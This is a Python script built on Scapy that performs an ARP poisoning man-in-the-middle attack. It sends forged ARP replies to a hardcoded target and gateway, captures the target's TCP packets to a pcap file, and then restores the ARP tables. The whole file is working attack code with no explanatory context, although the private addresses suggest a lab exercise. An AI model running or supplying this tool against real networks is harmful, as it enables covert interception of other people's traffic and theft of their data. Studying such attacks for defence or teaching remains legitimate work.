from scapy.all import *
import os
import sys
import threading
import signal

packet_count = 30
conf.verb = 0


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*]Restoring target...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=target_mac), count=5)
    os.kill(os.getpid(), signal.SIGINT)


def get_mac(ip_address):
    try:
        responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2)
    except Exception as e:
        print(str(e))
        sys.exit(0)
    for s, r in responses:
        return r[Ether].src


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison.[CTRL-C to stop]")

    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            print("send sucess!")
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    print("[*] ARP poison attack finished.")
    return

def analysis(packet):
    l1 = packet.payload
    l1.show()
    l2 = packet.payload.payload
    l2.show()
    l3 = packet.payload.payload.payload
    l3.show()
    pass

def sniff_message(gateway_ip, gateway_mac, target_ip, target_mac):
    try:
        print("[*]Starting sniffer for %d packets" % packet_count)
        bpf_filter = "ip host %s and tcp" % target_ip
        packets = sniff(count=packet_count, prn=analysis, filter=bpf_filter, iface=None)
        wrpcap('arppoison.pcap', packets)
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    except KeyboardInterrupt:
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        sys.exit(0)

def main():
    # if len(sys.argv[1:]) != 3:
    #     print("Usage ./arppoison.py [interface] [target_ip] [gateway_ip]")
    #     print("Example: ./arppoison.py eth0 192.168.1.3 192.168.1.1")
    #     sys.exit(0)
    # interface = sys.argv[1]
    # target_ip = sys.argv[2]
    # gateway_ip = sys.argv[3]
    interface = None
    target_ip = '192.168.126.130'
    gateway_ip = '192.168.126.2'

    #conf.iface = interface

    print("[*] Setting up %s" % (interface))

    gateway_mac = get_mac(gateway_ip)
    print(gateway_mac)
    if gateway_mac is None:
        print("[!!!] Failed to get gateway Mac. Exiting.")
        sys.exit(0)
    else:
        print("[*]Gateway %s at %s" % (gateway_ip, gateway_mac))
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print("[!!!]Failed to get target MAC.Exiting.")
        sys.exit(0)
    else:
        print("[*]Target %s is at %s" % (target_ip, target_mac))

    poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.start()
    sniff_thread = threading.Thread(target=sniff_message, args=(gateway_ip, gateway_mac, target_ip, target_mac))
    #sniff_thread.start()
    sniff_message(gateway_ip, gateway_mac, target_ip, target_mac)

if __name__=='__main__':
    main()
